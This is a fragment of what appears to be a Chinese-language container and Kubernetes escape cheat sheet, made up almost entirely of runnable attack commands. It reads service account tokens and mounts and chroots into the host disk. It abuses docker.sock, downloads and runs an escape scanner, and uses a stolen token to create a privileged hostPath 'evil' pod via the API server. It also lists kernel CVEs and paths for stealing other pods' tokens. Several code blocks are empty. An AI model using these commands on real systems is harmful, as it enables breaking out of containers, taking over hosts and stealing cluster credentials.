

   ```bash
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```

   ```bash
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   ```

   ```bash
   ```

   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   ```

   ```bash
   ```

   - container runtime socket (containerd / dockerd)


|------|------|---------|------|


```bash
# 拉 deepce（不依赖任何东西）
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# 输出：检测到 N 个逃逸路径
```


```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# 检查权限
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# 如果能 create pod，用 hostPath 挂宿主机
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# 然后 exec 进 evil pod，chroot /host
```


```bash
# 见 https://github.com/PaloAltoNetworks/cve-2022-0492
# 核心：mount cgroup → 写 release_agent → 触发空 cgroup → 在宿主机上下文执行
```


```text
1. 特权容器           → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin     → CVE-2022-0492 (release_agent) / 自己挂 cgroup
3. docker.sock       → docker run -v /:/host alpine chroot /host
4. K8s SA + 权限     → 起 hostPath/privileged pod
5. kernel CVE        → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```


```text
- /var/lib/kubelet/pods/        → 偷其他 pod 的 SA token
- /var/lib/docker/              → 看运行的容器列表
- ip addr                        → 用 hostNetwork 直接访问 service IP
- crictl ps                      → containerd 容器列表
- ps -ef --forest                → 找 kubelet / dockerd 启动参数（含 token）
```
